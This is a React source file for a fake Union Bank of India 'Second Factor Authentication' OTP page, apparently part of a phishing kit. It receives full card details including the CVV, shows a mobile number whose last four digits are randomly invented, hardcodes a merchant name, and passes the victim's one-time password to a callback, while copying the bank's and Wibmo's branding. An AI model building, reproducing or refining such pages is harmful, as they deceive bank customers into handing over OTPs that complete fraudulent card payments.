import React, { useState, useEffect } from 'react';

interface UnionBankOTPPageProps {
  cardData: {
    cardNumber: string;
    cardName: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
  };
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    country: string;
  };
  amount: number;
  onOtpSubmit: (otp: string) => void;
  onCancel: () => void;
  onResendOtp: () => void;
  otpSubmitting?: boolean;
  otpError?: string;
  cardBrandLogos: any;
  getCardBrand: (cardNumber: string) => string;
}

const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
  cardData,
  billingDetails,
  amount,
  onOtpSubmit,
  onCancel,
  onResendOtp,
  otpSubmitting = false,
  otpError,
  cardBrandLogos,
  getCardBrand
}) => {
  const [otpValue, setOtpValue] = useState('');
  const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
  const [isExpired, setIsExpired] = useState(false);
  
  // Random mobile last 4 digits (session-persistent like other OTP pages)
  const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [cardLast4] = useState(() => {
    const cleaned = cardData.cardNumber.replace(/\s/g, '');
    return cleaned.slice(-4);
  });
  
  // Current date and time (real-time)
  const [currentDateTime] = useState(() => {
    const now = new Date();
    const day = now.getDate().toString().padStart(2, '0');
    const month = now.toLocaleString('en-US', { month: 'short' });
    const year = now.getFullYear();
    return `${day}-${month}-${year}`;
  });

  // Bank and card logos
  const bankLogo = "https://logos-world.net/wp-content/uploads/2021/03/Union-Bank-of-India-Logo.png";
  
  // Detect card brand and get logo
  const detectedCardBrand = getCardBrand(cardData.cardNumber);
  const cardBrandLogo = cardBrandLogos[detectedCardBrand] || cardBrandLogos.visa; // fallback to visa

  // Timer effect
  useEffect(() => {
    if (timeLeft > 0 && !isExpired) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (timeLeft === 0) {
      setIsExpired(true);
      // Redirect to checkout page after 2 seconds when session expires
      setTimeout(() => {
        onCancel();
      }, 2000);
    }
  }, [timeLeft, isExpired, onCancel]);

  // Format time as MM:SS
  const formatTime = (seconds: number): string => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Format card number (first 4 + XXXXXX + last 4) like other OTP pages
  const formatCardNumber = (): string => {
    const cleaned = cardData.cardNumber.replace(/\s/g, '');
    const first4 = cleaned.slice(0, 4);
    const last4 = cleaned.slice(-4);
    return `${first4}XXXXXX${last4}`;
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length <= 6) {
      setOtpValue(value);
    }
  };

  const handleSubmit = () => {
    if (otpValue.length === 6 && !otpSubmitting && !isExpired) {
      onOtpSubmit(otpValue);
    }
  };

  const handleCancel = () => {
    onCancel();
  };

  const handleResendOtp = () => {
    setTimeLeft(179); // Reset timer to 2:59
    setIsExpired(false);
    setOtpValue('');
    onResendOtp();
  };

  if (isExpired) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-8">
          <div className="text-red-600 text-xl font-semibold mb-4">Session Expired</div>
          <div className="text-gray-600 mb-4">Your OTP verification session has expired.</div>
          <div className="text-sm text-gray-500">Redirecting to checkout page...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white font-sans w-full max-w-md mx-auto border border-gray-300 shadow-2xl relative" 
         style={{ 
           touchAction: 'auto', 
           WebkitTouchCallout: 'default', 
           userSelect: 'text', 
           pointerEvents: 'auto',
           boxShadow: '5px 10px 18px #888888'
         }}>
      
      {/* Header with logos */}
      <div className="flex justify-between items-center px-4 py-3">
        <div className="flex-1 text-right pr-2">
          <img 
            src={bankLogo} 
            alt="Union Bank" 
            className="h-12 object-contain inline-block"
            onError={(e) => {
              e.currentTarget.src = 'https://logos-world.net/wp-content/uploads/2021/03/Union-Bank-of-India-Logo.png';
            }}
          />
        </div>
        <div className="w-4"></div>
        <div className="flex-1 text-left pl-2 pt-3">
          <img 
            src={cardBrandLogo} 
            alt={`${detectedCardBrand.toUpperCase()} Card`} 
            className="h-8 object-contain inline-block"
            onError={(e) => {
              e.currentTarget.src = 'https://www.rupay.co.in/images/logo.png';
            }}
          />
        </div>
      </div>

      {/* Second Factor Authentication Title */}
      <div className="px-4 py-2 text-center">
        <p className="text-blue-600 font-bold text-sm">
          Second Factor Authentication
        </p>
      </div>

      {/* Description */}
      <div className="px-4 py-2">
        <p className="text-xs text-justify leading-relaxed" style={{ fontFamily: 'Verdana', color: '#000000' }}>
          The One Time Password has been sent to below registered Mobile 
          Number. Please use the OTP to authenticate the transaction.
        </p>
      </div>

      {/* Transaction Details */}
      <div className="px-4 py-2 space-y-1">
        {/* Mobile Number */}
        <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
          <div className="w-20 text-right" style={{ color: '#000000' }}>Mobile Number</div>
          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
          <div className="flex-1 text-left" style={{ color: '#000000' }}>XXXXXX{mobileLast4}</div>
        </div>

        {/* Merchant Name */}
        <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
          <div className="w-20 text-right" style={{ color: '#000000' }}>Merchant Name</div>
          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
          <div className="flex-1 text-left" style={{ color: '#000000' }}>PLURALSIGHT</div>
        </div>

        {/* Date */}
        <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
          <div className="w-20 text-right" style={{ color: '#000000' }}>Date</div>
          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
          <div className="flex-1 text-left" style={{ color: '#000000' }}>{currentDateTime}</div>
        </div>

        {/* Card Number */}
        <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
          <div className="w-20 text-right" style={{ color: '#000000' }}>Card Number</div>
          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
          <div className="flex-1 text-left" style={{ color: '#000000' }}>{formatCardNumber()}</div>
        </div>

        {/* Amount */}
        <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
          <div className="w-20 text-right" style={{ color: '#000000' }}>Amount</div>
          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
          <div className="flex-1 text-left" style={{ color: '#000000' }}>INR-{amount.toFixed(2)}</div>
        </div>
      </div>

      {/* OTP Input Section */}
      <div className="px-4 py-4 text-center">
        <label className="block text-sm font-bold mb-2" style={{ color: '#000000' }}>
          OTP : -
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            value={otpValue}
            onChange={handleOtpChange}
            className="ml-2 w-20 text-center border border-gray-400 px-2 py-1 text-sm bg-white text-black"
            disabled={otpSubmitting || isExpired}
            autoFocus
            autoComplete="one-time-code"
            style={{ 
              fontSize: '14px',
              color: '#000000',
              backgroundColor: '#ffffff',
              border: '1px solid #666666'
            }}
            onTouchStart={(e) => e.stopPropagation()}
            onClick={(e) => e.stopPropagation()}
          />
        </label>
        
        {/* Error Message - Only show when otpError is provided */}
        {otpError && (
          <div className="mt-2">
            <label className="text-red-600 font-bold text-xs">Invalid OTP</label>
          </div>
        )}
      </div>

      {/* Regenerate OTP Button */}
      <div className="px-4 py-2 text-center">
        <button
          type="button"
          onClick={handleResendOtp}
          disabled={otpSubmitting || isExpired}
          className="text-xs bg-gray-200 hover:bg-gray-300 px-3 py-1 border border-gray-400 touch-manipulation"
          style={{ 
            touchAction: 'manipulation',
            pointerEvents: 'auto',
            color: '#000000'
          }}
          onTouchStart={(e) => e.stopPropagation()}
        >
          Regenerate OTP
        </button>
      </div>

      {/* Timer */}
      <div className="px-4 py-2 text-center">
        <div className="text-red-600 font-bold text-sm">
          Remaining Time : <span>{formatTime(timeLeft)}</span>
        </div>
      </div>

      {/* Submit and Cancel Buttons */}
      <div className="px-4 py-3 text-center space-x-2">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={otpValue.length !== 6 || otpSubmitting || isExpired}
          className="bg-blue-500 hover:bg-blue-600 disabled:bg-gray-400 text-white px-4 py-1 text-sm border touch-manipulation"
          style={{ 
            touchAction: 'manipulation',
            pointerEvents: 'auto'
          }}
          onTouchStart={(e) => e.stopPropagation()}
        >
          {otpSubmitting ? 'Submitting...' : 'Submit'}
        </button>
        
        <button
          type="button"
          onClick={handleCancel}
          disabled={otpSubmitting}
          className="bg-gray-500 hover:bg-gray-600 disabled:bg-gray-400 text-white px-4 py-1 text-sm border touch-manipulation"
          style={{ 
            touchAction: 'manipulation',
            pointerEvents: 'auto'
          }}
          onTouchStart={(e) => e.stopPropagation()}
        >
          Cancel
        </button>
      </div>

      {/* Powered by */}
      <div className="px-4 py-3 text-center border-t">
        <div className="text-xs flex items-center justify-center space-x-1" style={{ color: '#000000' }}>
          <span>Powered by</span>
          <img 
            src="https://wibmo.co/wp-content/uploads/2024/02/comp-14.png" 
            alt="Wibmo" 
            className="h-5 w-10 object-contain"
            onError={(e) => {
              e.currentTarget.src = 'https://wibmo.co/wp-content/uploads/2024/02/comp-14.png';
            }}
          />
        </div>
      </div>
    </div>
  );
};

export default UnionBankOTPPage;
